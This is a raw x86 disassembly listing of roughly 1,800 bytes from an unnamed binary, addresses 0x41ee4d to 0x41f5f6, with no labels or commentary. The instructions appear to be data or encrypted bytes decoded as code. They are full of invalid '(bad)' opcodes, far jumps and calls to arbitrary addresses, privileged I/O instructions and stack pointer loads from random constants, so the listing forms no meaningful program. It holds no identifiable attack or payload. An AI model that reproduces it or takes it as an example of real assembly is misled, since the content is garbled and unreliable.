  41ee4d:	cmp    dl,BYTE PTR [esi+0x1722a21b]
  41ee53:	inc    ebx
  41ee54:	ror    DWORD PTR [ebx],0xc3
  41ee57:	mov    edi,0xa925c436
  41ee5c:	or     edx,esi
  41ee5e:	dec    edi
  41ee5f:	les    eax,FWORD PTR [ebx+0x6fedc8b7]
  41ee65:	push   edi
  41ee66:	call   0x576e:0xe15a6398
  41ee6d:	mov    al,ds:0xf4be5952
  41ee72:	cdq    
  41ee73:	(bad)  
  41ee75:	retf   
  41ee76:	(bad)  
  41ee77:	test   eax,0xcb702fd6
  41ee7c:	cli    
  41ee7d:	push   eax
  41ee7e:	mov    eax,0x9ebe678d
  41ee83:	mov    eax,ds:0xa3d2e587
  41ee88:	das    
  41ee89:	or     eax,0x3f0fea81
  41ee8e:	mov    fs,WORD PTR es:[ecx-0x5e]
  41ee92:	push   0x8
  41ee94:	mov    cl,0xf4
  41ee96:	sbb    al,0x8a
  41ee98:	scas   al,BYTE PTR es:[edi]
  41ee99:	jle    0x41ef0e
  41ee9b:	mov    bl,0x18
  41ee9d:	jmp    0x8d201af5
  41eea2:	mov    ds:0xb0baad45,al
  41eea7:	sahf   
  41eea8:	mov    cl,0x92
  41eeaa:	mov    esp,0x882f9fd8
  41eeaf:	inc    ecx
  41eeb0:	mov    WORD PTR [ebp-0x184c0f51],cs
  41eeb6:	cmp    ch,dl
  41eeb8:	in     eax,0xfe
  41eeba:	sbb    dl,BYTE PTR [esi]
  41eebc:	inc    eax
  41eebd:	dec    ebx
  41eebe:	or     DWORD PTR [esi+0x17c84aa4],esp
  41eec4:	add    eax,0xc6a3b7ae
  41eec9:	xchg   esi,eax
  41eeca:	or     DWORD PTR [ebx],ecx
  41eecc:	fdivr  DWORD PTR [edi]
  41eece:	mov    esi,0xf93c6226
  41eed3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eed4:	sti    
  41eed5:	lahf   
  41eed6:	jno    0x41eefb
  41eed8:	adc    BYTE PTR [eax+0x39],bh
  41eedb:	inc    ecx
  41eedc:	(bad)  
  41eedd:	fsubr  st,st(3)
  41eedf:	imul   edi,DWORD PTR [ebx+0xd9f1214],0x3d
  41eee6:	rcl    BYTE PTR [esi],1
  41eee8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eee9:	fldenv ds:0xdd8cf085
  41eeef:	dec    eax
  41eef0:	push   edx
  41eef1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eef2:	inc    esi
  41eef3:	mov    dh,0x28
  41eef5:	pop    ds
  41eef6:	(bad)  
  41eef7:	mov    gs,WORD PTR [eax+eax*1+0x0]
  41eefb:	add    BYTE PTR [eax-0x77],bh
  41eefe:	hlt    
  41eeff:	mov    al,0xf5
  41ef01:	std    
  41ef02:	jl     0x41eecd
  41ef04:	dec    edi
  41ef05:	pop    ds
  41ef06:	cmp    DWORD PTR [ebx+0x77],ebp
  41ef09:	test   dh,cl
  41ef0b:	popa   
  41ef0c:	or     al,0x6c
  41ef0e:	add    DWORD PTR [eax],eax
  41ef10:	test   DWORD PTR [edx],eax
  41ef12:	add    BYTE PTR [eax],al
  41ef14:	fist   DWORD PTR [ebx+ecx*1+0x70]
  41ef18:	sbb    al,0xf1
  41ef1a:	inc    ebp
  41ef1b:	and    al,0x61
  41ef1d:	pusha  
  41ef1e:	iret   
  41ef1f:	xchg   ecx,eax
  41ef20:	test   al,0x9d
  41ef22:	push   eax
  41ef23:	mov    ebp,0xee272664
  41ef28:	sub    DWORD PTR [esi+ecx*4-0x3a],ebp
  41ef2c:	icebp  
  41ef2d:	(bad)  
  41ef2e:	push   ss
  41ef2f:	push   edx
  41ef31:	rcr    BYTE PTR [ebp-0x5a],cl
  41ef34:	imul   ecx,DWORD PTR [edi-0x75d3ffef],0x48
  41ef3b:	ins    DWORD PTR es:[edi],dx
  41ef3c:	mov    ebx,0xaa6687fd
  41ef41:	int    0x23
  41ef43:	data16 arpl WORD PTR [edi-0x21e7380b],bp
  41ef4a:	gs mov al,0x1c
  41ef4d:	loop   0x41eeef
  41ef4f:	aas    
  41ef50:	sbb    al,0xa9
  41ef52:	aaa    
  41ef53:	fisttp DWORD PTR [edx-0x40]
  41ef56:	aam    0x4f
  41ef58:	inc    eax
  41ef59:	das    
  41ef5a:	pop    ecx
  41ef5b:	mov    bl,0xb4
  41ef5d:	xor    BYTE PTR [edx-0x7a],bh
  41ef60:	test   al,0x1d
  41ef62:	add    edi,eax
  41ef64:	sbb    ebp,DWORD PTR [esi+ebx*4-0x51354e95]
  41ef6b:	js     0x41ef56
  41ef6d:	and    ecx,ebp
  41ef6f:	into   
  41ef70:	imul   edi,DWORD PTR [ecx-0x69],0x810cfa02
  41ef77:	mov    BYTE PTR [esp+edi*2-0x21],ch
  41ef7b:	fiadd  DWORD PTR [edx-0x200c7906]
  41ef81:	mov    bl,0x6c
  41ef83:	ins    BYTE PTR es:[edi],dx
  41ef84:	sbb    BYTE PTR [edi+0x496ebe73],dl
  41ef8a:	pop    edi
  41ef8b:	xor    cl,al
  41ef8d:	mov    bl,0xff
  41ef8f:	push   esp
  41ef90:	nop
  41ef91:	xlat   BYTE PTR ds:[ebx]
  41ef92:	outs   dx,DWORD PTR ds:[esi]
  41ef93:	ins    BYTE PTR es:[edi],dx
  41ef94:	iret   
  41ef95:	sbb    al,BYTE PTR [edx]
  41ef97:	sbb    al,0x4e
  41ef99:	mov    ss,WORD PTR ds:0x52ce72ad
  41ef9f:	loope  0x41ef76
  41efa1:	clc    
  41efa2:	retf   
  41efa3:	out    dx,al
  41efa4:	and    cl,BYTE PTR [ebx+0x2a]
  41efa7:	stos   BYTE PTR es:[edi],al
  41efa8:	and    DWORD PTR [edx+0x15c39a36],edi
  41efae:	(bad)  
  41efaf:	mov    dl,0x3c
  41efb1:	xchg   edi,eax
  41efb2:	push   DWORD PTR [edx]
  41efb4:	jae    0x41ef37
  41efb6:	in     al,0x51
  41efb8:	out    0xba,al
  41efba:	sub    eax,DWORD PTR [edi+0x2a3e4350]
  41efc0:	dec    ecx
  41efc1:	popf   
  41efc2:	pushf  
  41efc3:	jo     0x41ef7e
  41efc5:	in     eax,dx
  41efc6:	sbb    dh,ah
  41efc8:	lea    esi,[esi-0x4198d2d2]
  41efce:	xchg   edx,eax
  41efcf:	sbb    BYTE PTR fs:[edx-0x7b],al
  41efd3:	adc    al,0xca
  41efd5:	pop    eax
  41efd6:	cs fwait
  41efd8:	xlat   BYTE PTR ds:[ebx]
  41efd9:	lds    ecx,FWORD PTR [edx]
  41efdb:	jl     0x41efc2
  41efdd:	xchg   BYTE PTR [eax],ch
  41efdf:	mov    cl,BYTE PTR [eax-0x24]
  41efe2:	stos   DWORD PTR es:[edi],eax
  41efe3:	into   
  41efe4:	(bad)
  41efe8:	and    ebx,esi
  41efea:	aad    0x8
  41efec:	js     0x41f02e
  41efee:	mov    ebp,0x9256080
  41eff3:	cld    
  41eff4:	mov    dh,BYTE PTR ss:[ebp-0x349bd0e9]
  41effb:	jns    0x41f011
  41effd:	and    DWORD PTR [ecx-0x63],edx
  41f000:	gs pop ss
  41f002:	dec    ebx
  41f003:	mov    ebp,0x1972540d
  41f008:	in     al,dx
  41f009:	or     eax,0x5f36a71f
  41f00e:	(bad)  [edi-0x55]
  41f011:	(bad)  
  41f012:	lds    ebx,FWORD PTR [ecx+0x34]
  41f015:	mov    esi,0x9739a81f
  41f01a:	daa    
  41f01b:	leave  
  41f01c:	adc    eax,0xef9a144e
  41f021:	inc    edx
  41f022:	and    DWORD PTR [esi-0x11],ebp
  41f025:	sbb    dh,dh
  41f027:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f028:	xchg   ebp,eax
  41f029:	aas    
  41f02a:	jne    0x41f02e
  41f02c:	loopne 0x41f046
  41f02e:	xor    eax,0x456f8568
  41f033:	push   ebp
  41f034:	mov    eax,ds:0xf4ad703f
  41f039:	popf   
  41f03a:	and    al,0x3f
  41f03c:	mov    eax,ds:0x69ad467
  41f041:	jg     0x41efe6
  41f043:	sub    eax,0x6079241a
  41f048:	test   BYTE PTR [esi+0x37],dh
  41f04b:	push   esp
  41f04c:	xor    al,0x5b
  41f04e:	or     eax,0xe2e48e1f
  41f053:	inc    ebp
  41f054:	repz les edi,FWORD PTR [esi-0x2e126963]
  41f05b:	jecxz  0x41f02d
  41f05d:	inc    ebp
  41f05e:	in     al,0x28
  41f060:	pop    eax
  41f061:	adc    bh,BYTE PTR [esp+edx*1-0xccc069]
  41f068:	sahf   
  41f069:	aas    
  41f06a:	addr16 pop edx
  41f06c:	in     al,dx
  41f06d:	dec    esp
  41f06e:	dec    ebx
  41f06f:	jno    0x41f043
  41f071:	aad    0xb6
  41f073:	(bad)  
  41f074:	jmp    0x2a12:0xcf3a650
  41f07b:	fcom   st(0)
  41f07d:	mov    edx,0x7ad9887a
  41f082:	dec    eax
  41f083:	call   0x1f7abf70
  41f088:	inc    BYTE PTR [edi]
  41f08a:	mov    al,ds:0x7f980093
  41f08f:	in     eax,dx
  41f090:	aas    
  41f091:	jmp    0x41f05b
  41f093:	stos   BYTE PTR es:[edi],al
  41f094:	jmp    0x41f087
  41f096:	loopne 0x41f045
  41f098:	fidivr DWORD PTR [esi-0x32]
  41f09b:	call   FWORD PTR [ecx+0x71]
  41f09e:	je     0x41f088
  41f0a0:	mov    ah,0xe2
  41f0a2:	nop
  41f0a3:	jmp    0xaa1eb12
  41f0a8:	xchg   BYTE PTR [edi+ebp*2-0x57],bl
  41f0ac:	jae    0x41f0f1
  41f0ae:	and    BYTE PTR [eax+ebp*1],cl
  41f0b1:	sub    BYTE PTR [edx],0x5
  41f0b4:	xor    BYTE PTR [esi-0x34],bh
  41f0b7:	mov    al,ds:0x9b7f63b8
  41f0bc:	jge    0x41f0c4
  41f0be:	inc    esi
  41f0bf:	test   eax,eax
  41f0c1:	aam    0xe3
  41f0c3:	sub    BYTE PTR [ebp+0x26808e2e],ch
  41f0c9:	fptan  
  41f0cb:	xchg   esi,eax
  41f0cc:	fcmovnu st,st(3)
  41f0ce:	xchg   esp,eax
  41f0cf:	or     DWORD PTR [ebp-0x67],ecx
  41f0d2:	push   ecx
  41f0d3:	mov    dl,dl
  41f0d5:	mov    ds:0x319b3ba,eax
  41f0da:	out    0x5a,al
  41f0dc:	pop    edx
  41f0dd:	jno    0x41f062
  41f0df:	mov    ah,0xf9
  41f0e1:	dec    edx
  41f0e2:	jge    0x41f0a7
  41f0e4:	mov    ds:0xa4d735f1,eax
  41f0e9:	out    0x44,al
  41f0eb:	sbb    bl,BYTE PTR [edx]
  41f0ed:	pop    ebp
  41f0ee:	(bad)  
  41f0ef:	mov    ah,0xae
  41f0f1:	mov    esi,0x9527e656
  41f0f6:	dec    ebx
  41f0f7:	push   0xffffff80
  41f0f9:	fdiv   DWORD PTR [ebp+0x5fe4ad86]
  41f0ff:	test   DWORD PTR [eax],ebx
  41f101:	dec    esp
  41f102:	les    edx,FWORD PTR [esi+0x3cea54c4]
  41f108:	loope  0x41f171
  41f10a:	out    dx,eax
  41f10b:	mov    WORD PTR [ecx*4-0x3c0a5705],?
  41f112:	shl    BYTE PTR [edi-0x4ddc1c21],1
  41f118:	outs   dx,BYTE PTR ds:[esi]
  41f119:	cli    
  41f11a:	imul   eax,edx,0xbf21747d
  41f120:	daa    
  41f121:	scas   eax,DWORD PTR es:[edi]
  41f122:	outs   dx,BYTE PTR ds:[esi]
  41f123:	gs push edx
  41f125:	fnstsw WORD PTR [edi]
  41f127:	shr    dh,1
  41f129:	jo     0x41f0b0
  41f12b:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  41f12d:	push   edi
  41f12e:	pop    esp
  41f12f:	pop    edi
  41f130:	pop    edi
  41f131:	fidiv  WORD PTR [edi+0x600d6439]
  41f137:	mov    ds,WORD PTR [ebp-0x3d0a7c9c]
  41f13d:	cwde   
  41f13e:	jge    0x41f1ba
  41f140:	mov    ebp,0x3ad5d047
  41f145:	lods   eax,DWORD PTR ds:[esi]
  41f146:	add    BYTE PTR cs:[ebp+0x6026890f],ch
  41f14d:	not    BYTE PTR [eax-0x784713ac]
  41f153:	xor    DWORD PTR [ecx+0x14],ebp
  41f156:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f157:	mov    ch,BYTE PTR [ebx+0x2f]
  41f15a:	test   al,0xc4
  41f15c:	mov    al,ds:0xa9bb1ee
  41f161:	test   eax,0xa4f01c0a
  41f166:	icebp  
  41f167:	in     eax,dx
  41f168:	gs or  al,0xf2
  41f16b:	cmp    eax,0x71efcaec
  41f170:	scas   al,BYTE PTR es:[edi]
  41f171:	arpl   bx,bp
  41f173:	pop    esp
  41f174:	ret    
  41f175:	mov    WORD PTR [edi+edi*1],ss
  41f178:	mov    esp,0x628fbbf4
  41f17d:	gs imul edx,DWORD PTR es:[ebp-0x26],0x64e0fb2d
  41f186:	push   esi
  41f187:	fcmovbe st,st(6)
  41f189:	cmpps  xmm4,XMMWORD PTR [edi],0xf2
  41f18d:	inc    edx
  41f18e:	add    eax,0x8220ee4d
  41f193:	stos   DWORD PTR es:[edi],eax
  41f194:	and    eax,0x6434df97
  41f199:	add    BYTE PTR [eax],al
  41f19b:	add    BYTE PTR [edx+ecx*4-0x49],bl
  41f19f:	imul   esi,edi,0x7f
  41f1a2:	fdivr  QWORD PTR [edi-0x2621f8a7]
  41f1a8:	fcom   DWORD PTR [ecx+0x31]
  41f1ab:	mov    edi,0x16e91
  41f1b0:	test   DWORD PTR [edx],eax
  41f1b2:	add    BYTE PTR [eax],al
  41f1b4:	shr    DWORD PTR [edx+ebp*2-0x5cf3f1c],cl
  41f1bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f1bc:	xor    DWORD PTR [edx+0x7a],ebx
  41f1bf:	ins    BYTE PTR es:[edi],dx
  41f1c0:	loope  0x41f21c
  41f1c2:	popa   
  41f1c3:	out    0x16,al
  41f1c5:	imul   eax,DWORD PTR [edx+0xd7e8b32],0xeb4537df
  41f1cf:	test   al,0x1d
  41f1d1:	outs   dx,DWORD PTR ds:[esi]
  41f1d2:	jg     0x41f234
  41f1d4:	add    DWORD PTR [ecx-0xf],esp
  41f1d7:	mov    esp,0xf5821afd
  41f1dc:	adc    dl,dh
  41f1de:	sub    dh,BYTE PTR [ebx-0x73fa0d35]
  41f1e4:	and    BYTE PTR [ebp+0x7b1944b7],dl
  41f1ea:	fsub   QWORD PTR [ebx]
  41f1ec:	push   ebx
  41f1ed:	jle    0x41f1f4
  41f1ef:	and    BYTE PTR ds:0xa677259c,bl
  41f1f5:	gs pop esp
  41f1f7:	dec    ebp
  41f1f8:	mov    edi,0x1dadf7a8
  41f1fd:	xlat   BYTE PTR ds:[ebx]
  41f1fe:	mov    cl,0x36
  41f200:	lahf   
  41f201:	push   ebp
  41f202:	or     eax,0x975fb1af
  41f207:	sub    BYTE PTR [edx-0x3f],cl
  41f20a:	mov    ecx,0x5efb1765
  41f20f:	enter  0x6e58,0xad
  41f213:	sbb    eax,0x50c5d80
  41f218:	push   ss
  41f219:	stc    
  41f21a:	jmp    DWORD PTR [ebp+0x39]
  41f21d:	iret   
  41f21e:	mov    DWORD PTR [edi],edi
  41f220:	or     al,ch
  41f222:	sahf   
  41f223:	cmp    eax,0xcd5a9aab
  41f228:	mov    WORD PTR [bp+si+0xaa0],?
  41f22d:	arpl   WORD PTR [esi-0x6a],ax
  41f230:	pop    edx
  41f231:	xor    DWORD PTR [ebp+0x77],ebp
  41f234:	xchg   ecx,eax
  41f235:	neg    DWORD PTR [esi]
  41f237:	(bad)
  41f23a:	jbe    0x41f1f1
  41f23c:	pop    ds
  41f23d:	les    esp,FWORD PTR [ebp-0x6e96dd4f]
  41f243:	jl     0x41f26a
  41f245:	dec    eax
  41f246:	pop    ds
  41f247:	sub    eax,DWORD PTR [esi+esi*8-0x5462a6a7]
  41f24e:	(bad)  
  41f24f:	xor    eax,0xb5e12eb7
  41f254:	in     al,dx
  41f255:	lahf   
  41f256:	aaa    
  41f257:	(bad)  
  41f259:	popa   
  41f25a:	icebp  
  41f25b:	push   ecx
  41f25c:	jecxz  0x41f21a
  41f25e:	call   0xc69caeb3
  41f263:	clc    
  41f264:	mov    ds,edx
  41f266:	mov    ss,ebx
  41f268:	mov    ah,0x22
  41f26a:	push   es
  41f26b:	sbb    bl,dh
  41f26d:	in     al,0x28
  41f26f:	xchg   edi,eax
  41f270:	jo     0x41f2c0
  41f272:	call   0xb0a998b4
  41f277:	pop    ebx
  41f278:	loope  0x41f229
  41f27a:	or     edi,DWORD PTR [esi-0x41d4dfd3]
  41f280:	adc    esi,DWORD PTR [ecx]
  41f282:	ret    0xe6e8
  41f285:	xor    ebp,eax
  41f287:	mov    ds:0xa2ec4d1d,eax
  41f28c:	mov    ds:0x7e142a4e,eax
  41f291:	(bad)  
  41f292:	pop    ebp
  41f293:	mov    ecx,0xd411c1f
  41f298:	inc    esi
  41f299:	push   ebp
  41f29a:	jbe    0x41f2da
  41f29c:	mov    ecx,0x3b739c68
  41f2a1:	aas    
  41f2a2:	out    dx,al
  41f2a3:	scas   al,BYTE PTR es:[edi]
  41f2a4:	dec    esi
  41f2a6:	adc    DWORD PTR [edx-0x6],eax
  41f2a9:	rcr    ebp,0x2d
  41f2ac:	call   0xa2c16be2
  41f2b1:	add    al,ch
  41f2b3:	fidivr WORD PTR [ecx-0x58f51547]
  41f2b9:	mov    bh,0xb6
  41f2bb:	lds    ebp,FWORD PTR [edi-0x69e6a2]
  41f2c1:	fld    TBYTE PTR [esi-0x5818203b]
  41f2c8:	mov    ah,0xa0
  41f2ca:	or     al,0x13
  41f2cc:	mov    ch,0x3
  41f2ce:	outs   dx,DWORD PTR ds:[esi]
  41f2cf:	mov    bh,BYTE PTR [esi+0x43e9e3dc]
  41f2d5:	jge    0x41f2dd
  41f2d7:	xchg   cl,ch
  41f2d9:	in     eax,dx
  41f2da:	dec    edx
  41f2db:	scas   eax,DWORD PTR es:[edi]
  41f2dc:	xor    DWORD PTR [esp+ecx*1],esi
  41f2df:	lea    ecx,[edi-0x76914891]
  41f2e5:	sbb    bh,BYTE PTR [ecx-0x48]
  41f2e8:	sbb    BYTE PTR [bx+di+0x68],dh
  41f2ec:	arpl   si,si
  41f2ee:	(bad)  
  41f2ef:	scas   eax,DWORD PTR es:[edi]
  41f2f0:	int3   
  41f2f1:	outs   dx,BYTE PTR ds:[esi]
  41f2f2:	mov    eax,0x90ea0851
  41f2f7:	jne    0x41f292
  41f2f9:	sub    eax,DWORD PTR ds:0x1e450b1d
  41f2ff:	cli    
  41f300:	dec    ebp
  41f301:	test   DWORD PTR ds:0xdae03016,esi
  41f307:	dec    esp
  41f308:	in     al,dx
  41f309:	push   eax
  41f30a:	jp     0x41f35a
  41f30c:	loopne 0x41f349
  41f30e:	push   0x69
  41f310:	popa   
  41f311:	add    eax,0x40bf8ef6
  41f316:	push   esi
  41f317:	dec    eax
  41f318:	push   ebx
  41f319:	cs jb  0x41f2fc
  41f31c:	sbb    al,0x88
  41f31e:	shl    BYTE PTR [ebx+eiz*2],1
  41f321:	mov    al,0x4b
  41f323:	mov    eax,ds:0x7f86433
  41f328:	rcr    BYTE PTR [eax+0x113b1c95],0x17
  41f32f:	or     DWORD PTR [ecx-0x78],esp
  41f332:	cmp    al,BYTE PTR [edi+0x6faf3077]
  41f338:	inc    ecx
  41f339:	jle    0x41f322
  41f33b:	(bad)  
  41f33c:	jo     0x41f378
  41f33e:	cwde   
  41f33f:	inc    eax
  41f340:	bound  ecx,QWORD PTR [edx+0x40]
  41f343:	mov    bl,0x65
  41f345:	shr    edx,1
  41f347:	stc    
  41f348:	out    dx,al
  41f349:	imul   esp,DWORD PTR [edi+0x4a9a0d9],0x6ed8ea11
  41f353:	xor    ch,bh
  41f355:	xor    BYTE PTR [ebx],0xcb
  41f358:	cmp    BYTE PTR ds:[esi-0x3f],al
  41f35c:	stc    
  41f35d:	fisub  DWORD PTR [eax+0x675fa2ee]
  41f363:	stos   DWORD PTR es:[edi],eax
  41f364:	mov    eax,ds:0x144a08d6
  41f369:	push   0x137ac6e4
  41f36e:	cmp    esp,DWORD PTR [ebx-0x5f199ed6]
  41f374:	cmp    ecx,DWORD PTR [edi+0x7d94636a]
  41f37a:	pop    esi
  41f37b:	hlt    
  41f37c:	mov    esp,0x67a6be28
  41f381:	and    DWORD PTR [ebx+0x3b],edi
  41f384:	lock in al,0xc0
  41f387:	ror    ebp,cl
  41f389:	shl    BYTE PTR [edx-0x53],cl
  41f38c:	cmp    BYTE PTR [edx+esi*4],ch
  41f38f:	addr16 int3 
  41f391:	and    DWORD PTR [ebp+0x560dafc3],eax
  41f397:	inc    esp
  41f398:	fs stos DWORD PTR es:[edi],eax
  41f39a:	mov    dh,0xc
  41f39c:	sbb    al,al
  41f39e:	gs pop ds
  41f3a0:	pop    esp
  41f3a1:	push   0xfffffff8
  41f3a3:	mov    ecx,0x370523a5
  41f3a8:	popf   
  41f3a9:	test   eax,0x59c844da
  41f3ae:	mov    ds:0xc64a8ec7,al
  41f3b3:	xchg   ebp,eax
  41f3b4:	and    eax,0xb53cfbe7
  41f3b9:	bound  esi,QWORD PTR [edi-0x4b]
  41f3bc:	mov    esp,0xb0921ce7
  41f3c1:	mov    dh,BYTE PTR [edx+0x3b]
  41f3c4:	pop    es
  41f3c5:	loope  0x41f34d
  41f3c7:	add    al,0x92
  41f3c9:	sub    ebp,DWORD PTR [ecx-0x4deb6034]
  41f3cf:	add    bh,ah
  41f3d1:	cmp    ch,BYTE PTR [edx+0x1db99b3e]
  41f3d7:	mov    edx,0x93627ee1
  41f3dc:	ror    BYTE PTR [eax+ecx*2-0x44c6ee06],0x5b
  41f3e4:	push   esi
  41f3e5:	into   
  41f3e6:	ins    DWORD PTR es:[edi],dx
  41f3e7:	mov    ds:0x5cbc1a24,al
  41f3ec:	inc    ecx
  41f3ed:	inc    ecx
  41f3ee:	pop    ecx
  41f3ef:	out    dx,eax
  41f3f0:	mov    ecx,eax
  41f3f2:	jbe    0x41f3be
  41f3f4:	ins    BYTE PTR es:[edi],dx
  41f3f5:	jecxz  0x41f403
  41f3f7:	xor    BYTE PTR [edx+0xffa349f],dl
  41f3fd:	and    BYTE PTR [ebx],0xe2
  41f400:	jmp    0x41f38b
  41f402:	out    dx,eax
  41f403:	loopne 0x41f41a
  41f405:	mov    bh,0xcb
  41f407:	and    ah,BYTE PTR [ecx]
  41f409:	ret    0x2524
  41f40c:	and    ebx,ebx
  41f40e:	sbb    eax,0x353f6d55
  41f413:	int    0xf0
  41f415:	aam    0x40
  41f417:	add    cl,BYTE PTR [eax-0x7a462e0f]
  41f41d:	rcl    DWORD PTR [ecx+0x5c0d589e],1
  41f423:	test   BYTE PTR [eax-0x336d7aa],al
  41f429:	dec    esi
  41f42a:	in     al,0x6f
  41f42c:	mov    ebx,0xe63cb371
  41f431:	mov    ch,0x5b
  41f433:	mov    dh,0xa8
  41f435:	or     DWORD PTR [edx-0x51],0x4a
  41f43c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f43d:	sbb    al,BYTE PTR [edi-0x204026]
  41f443:	jg     0x41f3f1
  41f445:	pop    ss
  41f446:	aad    0x14
  41f448:	mov    dl,0xcf
  41f44a:	mov    bl,0x30
  41f44c:	push   ss
  41f44d:	jno    0x41f450
  41f44f:	add    BYTE PTR [ebp-0x41fffffe],al
  41f455:	xchg   BYTE PTR [ebp+0x47e85c13],dh
  41f45b:	jle    0x41f4b0
  41f45d:	rcl    edi,1
  41f45f:	mov    al,0x93
  41f461:	or     ecx,DWORD PTR es:[ebx+0x38]
  41f465:	les    ebp,FWORD PTR [edx+0x5089f2ed]
  41f46b:	retf   0x1dfb
  41f46e:	les    eax,FWORD PTR [ebx+0x3f]
  41f471:	test   eax,0xc689d8fd
  41f476:	std    
  41f477:	xor    eax,0x3d1773c2
  41f47c:	and    ebp,DWORD PTR [edx-0x66]
  41f47f:	cmp    eax,0x5e4b500a
  41f484:	push   ss
  41f485:	adc    edx,DWORD PTR [ecx-0x13]
  41f488:	(bad)  
  41f489:	ins    DWORD PTR es:[edi],dx
  41f48a:	and    cl,BYTE PTR [eax]
  41f48c:	mov    esp,0x1bf73cd9
  41f491:	sbb    DWORD PTR [eax+eiz*1-0x53],ecx
  41f495:	enter  0xe8f9,0x3c
  41f499:	into   
  41f49a:	sti    
  41f49b:	in     eax,0xc6
  41f49d:	loopne 0x41f4e6
  41f49f:	bound  eax,QWORD PTR [ecx+ebx*1]
  41f4a2:	retf   
  41f4a3:	ins    DWORD PTR es:[edi],dx
  41f4a4:	call   0x811d02fa
  41f4a9:	inc    ecx
  41f4aa:	push   ss
  41f4ab:	mov    eax,ds:0x1d39ee8
  41f4b0:	xchg   esp,eax
  41f4b1:	loop   0x41f4a1
  41f4b3:	sub    al,0x52
  41f4b5:	div    ebx
  41f4b7:	repz rcr BYTE PTR [edi-0x68448004],0xf4
  41f4bf:	cld    
  41f4c0:	add    ebp,DWORD PTR [ecx]
  41f4c2:	call   FWORD PTR [esi*8+0x42851755]
  41f4c9:	cmp    eax,0x2d4dfb07
  41f4ce:	mov    dl,0x4b
  41f4d0:	ss add eax,ebx
  41f4d3:	jno    0x41f456
  41f4d5:	jmp    0x5d157b38
  41f4da:	and    DWORD PTR [ebx],ebp
  41f4dc:	dec    ecx
  41f4dd:	ins    DWORD PTR es:[edi],dx
  41f4de:	mov    bl,0x2d
  41f4e0:	bound  ebx,QWORD PTR [esi]
  41f4e2:	jle    0x41f507
  41f4e4:	int    0xb6
  41f4e6:	mov    ebp,0xb36c971d
  41f4eb:	ss adc eax,0x1717f97d
  41f4f1:	and    BYTE PTR [ebx+0x10],ch
  41f4f4:	xor    eax,0xdf41884e
  41f4f9:	mov    esp,DWORD PTR [edi+0x43]
  41f4fc:	inc    edx
  41f4fd:	mov    edi,0xc84782ee
  41f502:	jmp    0x41f497
  41f504:	in     eax,dx
  41f505:	dec    ebx
  41f506:	or     eax,0xad43fc9c
  41f50b:	xchg   edi,eax
  41f50c:	xchg   ecx,eax
  41f50d:	imul   BYTE PTR [ebp+0x51da196b]
  41f513:	cdq    
  41f514:	cmp    eax,0xa47d8198
  41f519:	sub    ebp,ebx
  41f51b:	mov    al,0x7
  41f51d:	fsubr  DWORD PTR ds:0x88887727
  41f523:	sub    eax,DWORD PTR [esi-0xf]
  41f526:	je     0x41f56b
  41f528:	call   0x153b7f7d
  41f52d:	or     DWORD PTR [esi+0x19],esp
  41f530:	jnp    0x41f571
  41f532:	stc    
  41f533:	mov    cl,0xd9
  41f535:	popa   
  41f536:	jecxz  0x41f514
  41f538:	pushf  
  41f539:	ja     0x41f52c
  41f53b:	add    al,0x61
  41f53d:	dec    ecx
  41f53e:	sbb    ecx,DWORD PTR [edi+0x5e1affd]
  41f544:	pop    edi
  41f545:	repnz inc ebx
  41f547:	sub    dh,BYTE PTR [ebp+0x50]
  41f54a:	call   0xc3db:0x4bbdbd5b
  41f551:	mov    edx,0x9261ee10
  41f556:	push   0x29
  41f558:	jb     0x41f571
  41f55a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f55b:	call   DWORD PTR [ebp+0x45]
  41f55e:	ja     0x41f5c0
  41f560:	mov    ebx,0x8c21fed3
  41f565:	in     eax,0x92
  41f567:	pop    ds
  41f568:	retf   0x1e61
  41f56b:	dec    eax
  41f56c:	fld    TBYTE PTR [edi-0x3c]
  41f56f:	cmp    edi,ebp
  41f571:	or     eax,0x62f3dd61
  41f576:	dec    ebx
  41f577:	inc    esp
  41f578:	mov    bh,BYTE PTR ds:0x973d18bb
  41f57e:	jns    0x41f59f
  41f580:	sbb    DWORD PTR [ebx+0x0],esp
  41f583:	aam    0xac
  41f585:	data16 sbb dl,ah
  41f588:	repnz sub ebp,eax
  41f58b:	xchg   ch,dl
  41f58d:	xor    eax,0xfe332336
  41f593:	rcr    BYTE PTR [ebx+0x11d9b852],cl
  41f599:	jne    0x41f568
  41f59b:	or     esi,edi
  41f59d:	cdq    
  41f59e:	xlat   BYTE PTR ds:[ebx]
  41f59f:	fadd   DWORD PTR [ebx]
  41f5a1:	push   edx
  41f5a2:	mov    bl,0xdd
  41f5a4:	int3   
  41f5a5:	and    al,0x3b
  41f5a7:	leave  
  41f5a8:	loopne 0x41f54d
  41f5aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f5ab:	and    dl,ah
  41f5ad:	dec    esp
  41f5ae:	jp     0x41f53f
  41f5b0:	pusha  
  41f5b1:	inc    ecx
  41f5b2:	mov    ebp,0xab8ee34e
  41f5b7:	sub    bh,al
  41f5b9:	jmp    0x93e2:0x3850801e
  41f5c0:	icebp  
  41f5c1:	jg     0x41f595
  41f5c3:	dec    ebp
  41f5c4:	jbe    0x41f564
  41f5c6:	fisub  WORD PTR [ebp-0x277ea712]
  41f5cc:	test   DWORD PTR [edx-0x390ceaf9],ebx
  41f5d2:	dec    edx
  41f5d3:	icebp  
  41f5d4:	cs push eax
  41f5d6:	push   ebp
  41f5d7:	or     DWORD PTR [edi-0x14bd75a0],ebx
  41f5dd:	outs   dx,BYTE PTR ds:[esi]
  41f5de:	test   BYTE PTR [ebx+0x407e43c3],0x19
  41f5e5:	pop    ebp
  41f5e6:	push   ecx
  41f5e7:	push   ebx
  41f5e8:	pop    esp
  41f5e9:	sub    al,0x4
  41f5eb:	xchg   esi,eax
  41f5ec:	pusha  
  41f5ed:	int3   
  41f5ee:	dec    esi
  41f5ef:	jne    0x41f629
  41f5f1:	dec    ebx
  41f5f2:	pusha  
  41f5f3:	add    ecx,0xffffffb4
  41f5f6:	or     al,0x79
